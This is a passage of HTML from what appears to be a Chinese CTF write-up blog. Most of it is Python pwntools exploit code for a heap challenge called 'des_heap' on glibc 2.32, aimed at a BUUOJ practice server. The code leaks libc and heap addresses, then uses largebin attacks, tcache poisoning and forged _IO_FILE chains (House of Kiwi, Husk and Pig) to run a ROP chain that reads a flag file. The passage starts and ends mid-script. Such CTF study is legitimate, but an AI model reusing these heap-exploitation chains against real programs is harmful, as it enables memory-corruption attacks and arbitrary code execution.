__printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x398</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>orw = flat([<br>    rax,<span class="hljs-number">2</span>,rdi,heap_base + <span class="hljs-number">0xD00</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">4</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0x10</span>,read_addr,rdi,<span class="hljs-number">1</span>,write_addr<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD00</span>,<span class="hljs-string">&#x27;/flag\0&#x27;</span>,<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,orw,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>å¦é™„ shellcode ç‰ˆæœ¬ï¼ˆé¿å…é˜´é—´å‡ºé¢˜äººæ²™ç›’æ‹‰æ»¡ï¼Œ<strong>ä¾§ä¿¡é“ï¼Œæ¶æ„åå¤æ¨ªè·³</strong>ï¼Œæˆ–è€…<strong>æŠŠ flag è—èµ·æ¥</strong>ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./des_heap&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25296</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br>jmp_rsi = libc_base + <span class="hljs-number">0x00000000000756fd</span><br><span class="hljs-comment"># 0x00000000000756fd: mov r13d, 1; jmp rsi;</span><br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span 